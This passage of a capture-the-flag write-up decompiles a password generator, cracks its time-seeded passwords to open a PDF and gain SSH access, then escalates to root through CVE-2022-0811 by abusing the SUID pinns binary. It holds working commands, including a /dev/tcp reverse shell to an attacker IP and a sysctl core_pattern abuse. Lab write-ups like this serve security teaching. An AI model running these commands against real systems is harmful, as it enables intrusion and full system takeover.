+[+] Possible entry point: pyiboot01_bootstrap.pyc
+[+] Possible entry point: pyi_rth_subprocess.pyc
+[+] Possible entry point: pyi_rth_pkgutil.pyc
+[+] Possible entry point: pyi_rth_inspect.pyc
+[+] Possible entry point: pyi_rth_pyside2.pyc
+[+] Possible entry point: passwordGenerator.pyc
+[+] Found 142 files in PYZ archive
+[+] Successfully extracted pyinstaller archive: /opt/passwordGenerator
+
+You can now use a python decompiler on the pyc files within the extracted directory
+root@b81d5511afb9:/tmp# uncompyle6 /tmp/passwordGenerator_extracted/passwordGenerator.pyc
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3"># uncompyle6 version 3.9.0</span>
+<span class="mtk3"># Python bytecode version base 3.7.0 (3394)</span>
+<span class="mtk3"># Decompiled from: Python 3.7.16 (default, Feb 11 </span><span class="mtk3">2023, 03:01:17)</span>
+<span class="mtk3"># [GCC 10.2.1 20210110]</span>
+<span class="mtk3"># Embedded file name: passwordGenerator.py</span>
+<span class="mtk5">from</span><span class="mtk1"> PySide2.QtCore </span><span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk5">*</span>
+<span class="mtk5">from</span><span class="mtk1"> PySide2.QtGui </span><span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk5">*</span>
+<span class="mtk5">from</span><span class="mtk1"> PySide2.QtWidgets </span><span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk5">*</span>
+<span class="mtk5">from</span><span class="mtk1"> PySide2 </span><span class="mtk5">import</span><span class="mtk1"> QtWidgets</span>
+<span class="mtk5">import</span><span class="mtk1"> pyperclip</span>
+
+<span class="mtk7 mtki">class</span><span class="mtk1"> </span><span class="mtk8 mtku">Ui_MainWindow</span><span class="mtk1">(</span><span class="mtk8 mtku">object</span><span class="mtk1">):</span>
+
+    <span class="mtk3"># ...</span>
+
+<span class="mtk1">    </span><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">genPassword</span><span class="mtk1">(</span><span class="mtk9 mtki">self</span><span class="mtk1">):</span>
+<span class="mtk1">        </span><span class="mtk1">length</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">value</span>
+<span class="mtk1">        </span><span class="mtk1">char</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">index</span>
+
+<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">char</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">:</span>
+<span class="mtk1">            </span><span class="mtk1">charset</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvw</span><span class="mtk4">xyz1234567890~!@#$%^&amp;*()_-+=</span><span class="mtk6">{}</span><span class="mtk4">[]|:;&lt;&gt;,.?'</span>  
+<span class="mtk1">        </span><span class="mtk5">elif</span><span class="mtk1"> </span><span class="mtk1">char</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">:</span>
+<span class="mtk1">            </span><span class="mtk1">charset</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvw</span><span class="mtk4">xyz'</span>
+<span class="mtk1">        </span><span class="mtk5">elif</span><span class="mtk1"> </span><span class="mtk1">char</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">:</span>
+<span class="mtk1">            </span><span class="mtk1">charset</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvw</span><span class="mtk4">xyz1234567890'</span>
+
+<span class="mtk1">        </span><span class="mtk5">try</span><span class="mtk1">:</span>
+<span class="mtk1">            qsrand(QTime.currentTime().msec())</span>
+<span class="mtk1">            </span><span class="mtk1">password</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">''</span>
+<span class="mtk1">            </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk1">length</span><span class="mtk1">):</span>
+<span class="mtk1">                </span><span class="mtk1">idx</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> qrand() </span><span class="mtk5">%</span><span class="mtk1"> </span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">charset</span><span class="mtk1">)</span>
+<span class="mtk1">                </span><span class="mtk1">nchar</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">charset</span><span class="mtk1">[</span><span class="mtk1">idx</span><span class="mtk1">]</span>
+<span class="mtk1">                </span><span class="mtk1">password</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk1">nchar</span><span class="mtk1">)</span>
+
+<span class="mtk1">        </span><span class="mtk5">except</span><span class="mtk1">:</span>
+<span class="mtk1">            </span><span class="mtk1">msg</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> QMessageBox()</span>
+<span class="mtk1">            </span><span class="mtk1">msg</span><span class="mtk1">.setWindowTitle(</span><span class="mtk4">'Error'</span><span class="mtk1">)</span>
+<span class="mtk1">            </span><span class="mtk1">msg</span><span class="mtk1">.setText(</span><span class="mtk4">'Error while generating password!, Send a message </span><span class="mtk4">to the Author!'</span><span class="mtk1">)</span>
+<span class="mtk1">            </span><span class="mtk1">x</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">msg</span><span class="mtk1">.exec_()</span>
+
+<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">password</span>
+
+
+<span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">__name__</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'__main__'</span><span class="mtk1">:</span>
+<span class="mtk1">    </span><span class="mtk1">app</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> QtWidgets.QApplication()</span>
+<span class="mtk1">    </span><span class="mtk1">mainwindow</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">MainWindow</span><span class="mtk1">()</span>
+<span class="mtk1">    </span><span class="mtk1">mainwindow</span><span class="mtk1">.show()</span>
+<span class="mtk1">    </span><span class="mtk1">app</span><span class="mtk1">.exec_()</span>
+<span class="mtk3"># okay decompiling /tmp/passwordGenerator_extracte</span><span class="mtk3">d/passwordGenerator.pyc</span>
+</code></pre></div><p>Great, we have source code. The code is very simple. From the screenshot, we see that the length of the password is 32 and the list of characters is &ldquo;All characters&rdquo;.</p><p>The &ldquo;randomness&rdquo; comes from <code>qsrand(QTime.currentTime().msec())</code> and then <code>qrand()</code> multiple times. The problem is that the seed is predictable:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -q
+&gt;&gt;&gt; from PySide2.QtCore import *  
+&gt;&gt;&gt; QTime.currentTime().msec()
+539
+&gt;&gt;&gt; QTime.currentTime().msec()
+946
+&gt;&gt;&gt; QTime.currentTime().msec()
+875
+&gt;&gt;&gt; QTime.currentTime().msec()
+445
+&gt;&gt;&gt; QTime.currentTime().msec()
+927
+&gt;&gt;&gt; QTime.currentTime().msec()
+350
+&gt;&gt;&gt; QTime.currentTime().msec()
+777
+</code></pre></div><p>The idea here is to generate 32-character passwords for each possible seed (a total of 1000 possibilities). Then, use the passwords list with <code>john</code> and crack the PDF hash.</p><p>For this step, the passwords need to be generated from a Windows machine, because the pseudo-random number generator has a different implementation in Linux and Windows. Moreover, the screenshot shows a Qt interface that seems to be running on Windows.</p><p>This is the script to run (<code>gen.py</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">from</span><span class="mtk1"> PySide2.QtCore </span><span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk5">*</span>
+
+<span class="mtk1">length</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">32</span>
+<span class="mtk1">charset</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvw</span><span class="mtk4">xyz1234567890~!@#$%^&amp;*()_-+=</span><span class="mtk6">{}</span><span class="mtk4">[]|:;&lt;&gt;,.?'</span>  
+
+<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">gen_password</span><span class="mtk1">(</span><span class="mtk9 mtki">t</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">) -&gt; </span><span class="mtk8 mtku">str</span><span class="mtk1">:</span>
+<span class="mtk1">    qsrand(</span><span class="mtk9 mtki">t</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">password</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">''</span>
+
+<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk1">length</span><span class="mtk1">):</span>
+<span class="mtk1">        </span><span class="mtk1">idx</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> qrand() </span><span class="mtk5">%</span><span class="mtk1"> </span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">charset</span><span class="mtk1">)</span>
+<span class="mtk1">        </span><span class="mtk1">nchar</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">charset</span><span class="mtk1">[</span><span class="mtk1">idx</span><span class="mtk1">]</span>
+<span class="mtk1">        </span><span class="mtk1">password</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk1">nchar</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">password</span>
+
+<span class="mtk5">with</span><span class="mtk1"> </span><span class="mtk8">open</span><span class="mtk1">(</span><span class="mtk4">'passwords.txt'</span><span class="mtk1">, </span><span class="mtk4">'a'</span><span class="mtk1">) </span><span class="mtk5">as</span><span class="mtk1"> </span><span class="mtk1">f</span><span class="mtk1">:</span>
+<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">t</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">1000</span><span class="mtk1">):</span>
+<span class="mtk1">        </span><span class="mtk1">f</span><span class="mtk1">.</span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk8">gen_password</span><span class="mtk1">(</span><span class="mtk1">t</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk4">'</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">)</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#021944!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">PS ...&gt; <span class="pwsh-yellow">pip</span> install PySide2  
+...
+
+PS ...&gt; <span class="pwsh-yellow">python3</span> gen.py
+</code></pre></div><p>Now, we can take the file <code>passwords.txt</code> and bring it to our Linux machine to crack the PDF hash with <code>john</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">john</span> --wordlist=passwords.txt <span class="mtku">hash</span>
+Using default input encoding: UTF-8
+Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
+Cost 1 (revision) is 3 for all loaded hashes
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<span class="code-dark-yellow">YG7Q7RDzA+q&ke~MJ8!yRzoI^VQxSqSS</span> (<span class="code-dark-yellow">notes.pdf</span>)
+1g 0:00:00:00 DONE 100.0g/s 38400p/s 38400c/s 38400C/s S14Zelk{dW8lSg&gt;e,_gAd$su-3g^0i]Q..uU;lGzu-$k,2_fpnNJ#CB^%y$,yz&lt;WI&gt;  
+Use the "--show --format=PDF" options to display all of the cracked passwords reliably
+Session completed.
+</code></pre></div><p>Perfect, now we are able to unlock the PDF document. It contains the following text:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Dear Steven,
+As we discussed since I'm going on vacation you will be in charge of system maintenance. Please ensure that the system is fully patched and up to date.  
+Here is my password: b@mPRNSVTjjLKId1T
+System Administrator Ethan
+</code></pre></div><p>Alright, so we have access via SSH as <code>ethan</code> with password <code>b@mPRNSVTjjLKId1T</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> ethan@10.10.11.178
+ethan@10.10.11.178's password:
+<span class="code-green">ethan@vessel</span>:<span class="code-blue">~</span>$ cat user.txt
+4e16257fac9f46704b950d557a26b915  
+</code></pre></div><h2 id="privilege-escalation">Privilege escalation</h2><p>A basic enumeration shows that we have a strange binary file with SUID permissions:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">ethan@vessel</span>:<span class="code-blue">~</span>$ find / -perm -4000 2&gt;/dev/null
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/fusermount
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/bin/umount
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/at
+/usr/bin/chsh
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/pinns
+<span class="code-green">ethan@vessel</span>:<span class="code-blue">~</span>$ ls -l /usr/bin/pinns
+-rwsr-x--- 1 root ethan 814936 Mar 15  2022 <span class="code-white code-bg-red">/usr/bin/pinns</span>  
+</code></pre></div><p>If we search a bit, we can find the source code in C for this binary <a href="https://fossies.org/linux/cri-o/pinns/src/pinns.c">here</a>. Let&rsquo;s look at the parameter options:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">// ...</span>
+
+<span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk9 mtki">argc</span><span class="mtk1">, </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">**</span><span class="mtk9 mtki">argv</span><span class="mtk1">) {</span>
+<span class="mtk3">  // ...</span>
+
+<span class="mtk1">  </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk5">const</span><span class="mtk1"> </span><span class="mtk7 mtki">struct</span><span class="mtk1"> option long_options</span><span class="mtk5">[]</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> {</span>
+<span class="mtk1">      {</span><span class="mtk4">"help"</span><span class="mtk1">, no_argument, </span><span class="mtk6">NULL</span><span class="mtk1">, </span><span class="mtk4">'h'</span><span class="mtk1">},</span>
+<span class="mtk1">      {</span><span class="mtk4">"uts"</span><span class="mtk1">, optional_argument, </span><span class="mtk6">NULL</span><span class="mtk1">, </span><span class="mtk4">'u'</span><span class="mtk1">},</span>
+<span class="mtk1">      {</span><span class="mtk4">"ipc"</span><span class="mtk1">, optional_argument, </span><span class="mtk6">NULL</span><span class="mtk1">, </span><span class="mtk4">'i'</span><span class="mtk1">},</span>
+<span class="mtk1">      {</span><span class="mtk4">"net"</span><span class="mtk1">, optional_argument, </span><span class="mtk6">NULL</span><span class="mtk1">, </span><span class="mtk4">'n'</span><span class="mtk1">},</span>
+<span class="mtk1">      {</span><span class="mtk4">"user"</span><span class="mtk1">, optional_argument, </span><span class="mtk6">NULL</span><span class="mtk1">, </span><span class="mtk4">'U'</span><span class="mtk1">},</span>
+<span class="mtk1">      {</span><span class="mtk4">"cgroup"</span><span class="mtk1">, optional_argument, </span><span class="mtk6">NULL</span><span class="mtk1">, </span><span class="mtk4">'c'</span><span class="mtk1">},</span>
+<span class="mtk1">      {</span><span class="mtk4">"mnt"</span><span class="mtk1">, optional_argument, </span><span class="mtk6">NULL</span><span class="mtk1">, </span><span class="mtk4">'m'</span><span class="mtk1">},</span>
+<span class="mtk1">      {</span><span class="mtk4">"dir"</span><span class="mtk1">, required_argument, </span><span class="mtk6">NULL</span><span class="mtk1">, </span><span class="mtk4">'d'</span><span class="mtk1">},</span>
+<span class="mtk1">      {</span><span class="mtk4">"filename"</span><span class="mtk1">, required_argument, </span><span class="mtk6">NULL</span><span class="mtk1">, </span><span class="mtk4">'f'</span><span class="mtk1">},</span>
+<span class="mtk1">      {</span><span class="mtk4">"uid-mapping"</span><span class="mtk1">, optional_argument, </span><span class="mtk6">NULL</span><span class="mtk1">, UID_MAPPING},</span>
+<span class="mtk1">      {</span><span class="mtk4">"gid-mapping"</span><span class="mtk1">, optional_argument, </span><span class="mtk6">NULL</span><span class="mtk1">, GID_MAPPING},</span>
+<span class="mtk1">      {</span><span class="mtk4">"sysctl"</span><span class="mtk1">, optional_argument, </span><span class="mtk6">NULL</span><span class="mtk1">, </span><span class="mtk4">'s'</span><span class="mtk1">},</span>
+<span class="mtk1">  };</span>
+
+<span class="mtk3">  // ...</span>
+
+<span class="mtk1">  </span><span class="mtk5">while</span><span class="mtk1"> ((c </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">getopt_long</span><span class="mtk1">(argc, argv, </span><span class="mtk4">"mpchuUind:f:s:"</span><span class="mtk1">, long_options, </span><span class="mtk6">NULL</span><span class="mtk1">)) </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">) {</span>  
+<span class="mtk3">    // ...</span>
+<span class="mtk1">  }</span>
+
+  <span class="mtk5">return</span><span class="mtk1"> EXIT_SUCCESS;</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Option <code>m</code> is very interesting, because we could mount the whole filesystem as <code>root</code> (since it is a SUID binary) and then have read/write access. However, the <code>m</code> option was removed. We can verify it looking at the strings:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">ethan@vessel</span>:<span class="code-blue">~</span>$ strings /usr/bin/pinns | grep uU  
+pch<span class="code-red">uU</span>ind:f:s:
+</code></pre></div><p>Notice that <code>m</code> does not appear in the options string.</p><p>Another useful option is <code>s</code> (for <code>sysctl</code>). Actually, there are <a href="https://gtfobins.github.io/gtfobins/sysctl/">GTFOBins</a> for <code>sysctl</code>. We can read the description using my tool <a href="https://github.com/7Rocky/gtfobins-cli"><code>gtfobins-cli</code></a>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gtfobins-cli</span> --suid sysctl
+
+<span class="code-bg-green code-black">sysctl</span> ==&gt; <span class="code-yellow">https://gtfobins.github.io/gtfobins/sysctl/</span>
+
+
+<span class="code-red mtku">SUID</span>
+
+If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run <span class="code-cyan">sh -p</span>, omit the <span class="code-cyan">-p</span> argument on systems like Debian (&lt;= Stretch) that allow the default <span class="code-cyan">sh</span> shell to run with SUID privileges.  
+
+<span class="code-cyan">sudo install -m =xs $(which sysctl) .</span>
+
+<span class="code-cyan">COMMAND='/bin/sh -c id&gt;/tmp/id'</span>
+<span class="code-cyan">./sysctl "kernel.core_pattern=|$COMMAND"</span>
+<span class="code-cyan">sleep 9999 &</span>
+<span class="code-cyan">kill -QUIT $!</span>
+<span class="code-cyan">cat /tmp/id</span>
+</code></pre></div><p>Before exploiting this, we can research a little bit more and find out that it is actually <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-0811">CVE-2022-0811</a>, show-cased in <a href="https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/">www.crowdstrike.com</a>. It is actually a kernel exploit for Kubernetes Pods (containers). You can find more information at <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation/sensitive-mounts#proc-sys-kernel-core_pattern">HackTricks</a> as well.</p><h3 id="kernel-exploitation">Kernel exploitation</h3><p>The idea is to modify <code>/proc/sys/kernel/core_pattern</code> so that it runs a malicious script whenever a program crashes.</p><p>Let&rsquo;s create a script as a proof of concept:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">ethan@vessel</span>:<span class="code-blue">/tmp</span>$ cat &gt; script.sh  
+#!/bin/bash
+id &gt; /tmp/id
+^C
+<span class="code-green">ethan@vessel</span>:<span class="code-blue">/tmp</span>$ chmod +x script.sh
+</code></pre></div><p>Now, let&rsquo;s modify <code>kernel.core_pattern</code> configuration to run our script:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">ethan@vessel</span>:<span class="code-blue">/tmp</span>$ cat /proc/sys/kernel/core_pattern
+|/usr/share/apport/apport %p %s %c %d %P %E
+<span class="code-green">ethan@vessel</span>:<span class="code-blue">/tmp</span>$ pinns -s 'kernel.core_pattern=|/tmp/script.sh'
+[pinns:e]: Path for pinning namespaces not specified: Invalid argument
+<span class="code-green">ethan@vessel</span>:<span class="code-blue">/tmp</span>$ pinns -d /tmp -s 'kernel.core_pattern=|/tmp/script.sh'
+[pinns:e]: Filename for pinning namespaces not specified: Invalid argument
+<span class="code-green">ethan@vessel</span>:<span class="code-blue">/tmp</span>$ pinns -d /tmp -f file -s 'kernel.core_pattern=|/tmp/script.sh'
+[pinns:e] No namespace specified for pinning
+<span class="code-green">ethan@vessel</span>:<span class="code-blue">/tmp</span>$ pinns -i -d /tmp -f file -s 'kernel.core_pattern=|/tmp/script.sh'  
+<span class="code-green">ethan@vessel</span>:<span class="code-blue">/tmp</span>$ cat /proc/sys/kernel/core_pattern
+|/tmp/script.sh
+</code></pre></div><p>Notice how I entered parameters when the program requires them (<code>d</code> for directory, <code>f</code> for file and <code>i</code> for an IPC namespace) and that the kernel configuration changed. Now, let&rsquo;s crash a program with segmentation fault:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">ethan@vessel</span>:<span class="code-blue">/tmp</span>$ sleep 1000 &
+[1] 6921
+<span class="code-green">ethan@vessel</span>:<span class="code-blue">/tmp</span>$ cat /tmp/id
+cat: /tmp/id: No such file or directory
+<span class="code-green">ethan@vessel</span>:<span class="code-blue">/tmp</span>$ kill -SIGSEGV 6921
+<span class="code-green">ethan@vessel</span>:<span class="code-blue">/tmp</span>$
+[1]+  Segmentation fault      (core dumped) sleep 1000  
+<span class="code-green">ethan@vessel</span>:<span class="code-blue">/tmp</span>$ cat /tmp/id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre></div><p>It worked! Hence, let&rsquo;s run a reverse shell to get access as <code>root</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">ethan@vessel</span>:<span class="code-blue">/tmp</span>$ cat &gt; script.sh
+#!/bin/bash
+bash -i &gt;& /dev/tcp/10.10.17.44/4444 0&gt;&1
+^C
+<span class="code-green">ethan@vessel</span>:<span class="code-blue">/tmp</span>$ chmod +x script.sh
+<span class="code-green">ethan@vessel</span>:<span class="code-blue">/tmp</span>$ cat /proc/sys/kernel/core_pattern  
+|/tmp/script.sh
+<span class="code-green">ethan@vessel</span>:<span class="code-blue">/tmp</span>$ sleep 1000 &
+[1] 6931
+<span class="code-green">ethan@vessel</span>:<span class="code-blue">/tmp</span>$ kill -SIGSEGV 6931
+<span class="code-green">ethan@vessel</span>:<span class="code-blue">/tmp</span>$
+</code></pre></div><p>And the shell as <code>root</code> arrives:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.11.178.
+Ncat: Connection from 10.10.11.178:53558.
+bash: cannot set terminal process group (-1): Inappropriate ioctl for device  
+bash: no job control in this shell
+root@vessel:/# script /dev/null -c bash
+script /dev/null -c bash
+Script started, file is /dev/null
+root@vessel:/# ^Z
+zsh: suspended  ncat -nlvp 4444
+
+<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
+[1]  + continued  ncat -nlvp 4444
+                                 reset xterm
+root@vessel:/# export TERM=xterm
+root@vessel:/# export SHELL=bash
+root@vessel:/# stty rows 50 columns 158
+root@vessel:/# cat /root/root.txt
+debd391c11567c256ef110208f6e9220
+</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#port-scanning">Port scanning</a></li><li><a href="#enumeration">Enumeration</a><ul><li><a href="#git-enumeration">Git enumeration</a></li></ul></li><li><a href="#foothold">Foothold</a><ul><li><a href="#authentication-bypass">Authentication bypass</a></li><li><a href="#exploiting-a-cve">Exploiting a CVE</a></li></ul></li><li><a href="#system-enumeration">System enumeration</a><ul><li><a href="#reversing-a-windows-pe">Reversing a Windows PE</a></li></ul></li><li><a href="#privilege-escalation">Privilege escalation</a><ul><li><a href="#kernel-exploitation">Kernel exploitation</a></li></ul></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://tinyletter.com/7Rocky" method="post" target="popupwindow" onsubmit='return window.open("https://tinyletter.com/7Rocky","popupwindow","scrollbars=yes,width=800,height=600"),!0'><h3 class="tc">Receive a weekly blog digest</h3><p class="tc"><label for="tlemail"></label></p><p class="tc"><input type="text" class="w-80 f5 pv3 ph3 bg-light-gray bn search" placeholder="Enter your email address" name="email" id="tlemail">
+<input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Submit"></p><input type="hidden" value="1" name="embed">
+<input style="display:none;color:var(--header)" type="submit" value="Subscribe"><p class="tc">powered by <a href="https://tinyletter.com" target="_blank" title="TinyLetter">TinyLetter</a></p><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky's Blog. Cybersecurity and Maths 2023</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 